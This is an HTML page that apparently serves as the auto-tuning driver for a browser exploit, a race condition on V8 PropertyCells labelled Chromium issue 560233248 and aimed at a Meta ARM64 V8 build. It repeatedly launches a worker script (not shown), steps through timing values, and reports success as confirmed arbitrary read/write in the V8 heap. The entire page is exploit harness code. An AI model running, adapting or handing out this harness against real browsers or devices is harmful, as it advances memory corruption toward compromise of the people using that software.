<!doctype html>
<html>
<head><title>PropertyCell Race - Auto Tuner</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;font-size:13px;padding:20px;">
<div id="out"></div>
<script>
const out = document.getElementById('out');
const log = s => { out.innerHTML += s + '<br>'; console.log(s); };

// F values to try - centered around 1313 (desktop Chromium value)
// ARM64 Meta build may need different value
const F_VALUES = [
    1100, 1150, 1200, 1230, 1250,
    1270, 1290, 1300, 1310, 1313,
    1320, 1330, 1350, 1380, 1400,
    1430, 1450, 1480, 1500, 1550
];

let fIndex = 0;
let currentF = 0;
let worker = null;
let missCount = 0;
const MAX_MISS_PER_F = 36; // WINDOW from worker
const start = performance.now();

log('PropertyCell Race - Auto Tuner');
log('Chromium issue 560233248');
log('Will try F values: ' + F_VALUES.join(', '));
log('');

function elapsed() {
    return ((performance.now() - start) / 1000).toFixed(1);
}

function tryNextF() {
    if (fIndex >= F_VALUES.length) {
        log('');
        log('ALL F VALUES EXHAUSTED - race not firing');
        log('Possible causes:');
        log('  - Bug patched in this Meta V8 build');
        log('  - Need different F range for ARM64');
        log('Total time: ' + elapsed() + 's');
        return;
    }

    currentF = F_VALUES[fIndex++];
    missCount = 0;

    if (worker) worker.terminate();
    worker = new Worker('worker_tunable.js');

    worker.onmessage = ({data}) => {
        if (data.type === 'ready') {
            log('[F=' + currentF + '] worker ready, starting race...');
            worker.postMessage('arm');
            return;
        }

        if (data === 'ARMED') {
            worker.postMessage('check');
            return;
        }

        if (data === 'MISS') {
            missCount++;
            if (missCount >= MAX_MISS_PER_F) {
                log('[F=' + currentF + '] ' + missCount + ' misses, trying next F...');
                tryNextF();
            } else {
                // retry with same F
                worker.postMessage('arm');
            }
            return;
        }

        if (data === 'EXHAUSTED') {
            log('[F=' + currentF + '] lanes exhausted, trying next F...');
            tryNextF();
            return;
        }

        if (typeof data === 'string' && data.startsWith('PASS')) {
            worker.terminate();
            log('');
            log('██████████████████████████████');
            log('RACE WON! ' + data);
            log('Time: ' + elapsed() + 's');
            log('Arbitrary R/W in V8 heap confirmed');
            log('██████████████████████████████');
            return;
        }
    };

    worker.onerror = ({message}) => {
        log('[F=' + currentF + '] worker error: ' + message);
        tryNextF();
    };

    // Send F value config before starting
    worker.postMessage({type: 'config', F: currentF});
}

// Start
log('Starting with F=' + F_VALUES[0] + '...');
tryNextF();
</script>
</body>
</html>
